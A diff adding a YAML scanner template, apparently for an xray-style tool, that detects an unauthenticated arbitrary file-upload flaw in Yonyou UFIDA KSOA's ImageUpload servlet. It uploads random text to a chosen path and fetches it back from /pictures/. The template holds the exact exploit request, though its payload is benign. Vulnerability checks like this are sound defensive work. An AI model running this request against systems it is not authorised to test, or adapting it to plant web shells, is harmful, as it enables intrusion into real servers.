@@ -1,0 +1,18 @@
+name: yongyou-ufida-ksoa-image-upload-file
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(32)
+  hostname: request.url.host
+rules:
+  - method: POST
+    path: "/servlet/com.sksoft.bill.ImageUpload?filename={{randstr}}.txt&filepath=/" 
+    body:
+      "{{randbody}}"
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/pictures/{{randstr}}.txt"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(randbody))
+detail:
+  author: 666
